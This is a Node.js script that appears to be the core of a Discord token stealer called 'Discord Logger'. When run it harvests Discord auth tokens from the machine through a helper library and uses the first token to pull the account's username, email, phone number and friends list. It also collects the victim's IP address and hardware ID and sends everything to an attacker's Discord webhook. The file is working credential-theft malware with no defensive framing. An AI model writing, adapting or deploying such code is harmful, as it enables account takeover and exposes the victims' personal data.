const webhook = require('webhook-discord');
const config = require('./config.json')
const lib = require('./utils');

const Discord = new webhook.Webhook(config.webhook);

(async () => {
    let tokens = await lib.grabTokens();
    let user = await lib.user(tokens[0]);
    let hwid = await lib.hwid();
    let ip = await lib.ip();

    let nitroType;
    switch (user.premium_type) {
        case 0:
            nitroType = 'None';
            break;
        case 1:
            nitroType = 'Classic';
            break;
        case 2:
            nitroType = 'Normal';
            break;
    }

    msg = new webhook.MessageBuilder()
        .setName('Discord Logger')
        .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`)
        .addField('Username', `${user.username}#${user.discriminator}`)
        .addField('User ID', user.id)
        .addField('Email', `${user.email} [${user.verified ? 'Verified' : 'Not Verified'}]`)
        .addField('Phone', user.phone || 'No Phone Number')
        .addField('Language', user.locale)
        .addField('Nitro', nitroType)
        .addField('IP', ip)
        .addField('HWID', hwid)
        .addField('Creation Date', lib.convert(user.id))
        .setFooter(`Created by Bytes128`);

    if (config.showFriends) {
        let friends = await lib.friends(tokens[0])
        msg.addField('Friends', friends)
    }

    Discord.send(msg)
})();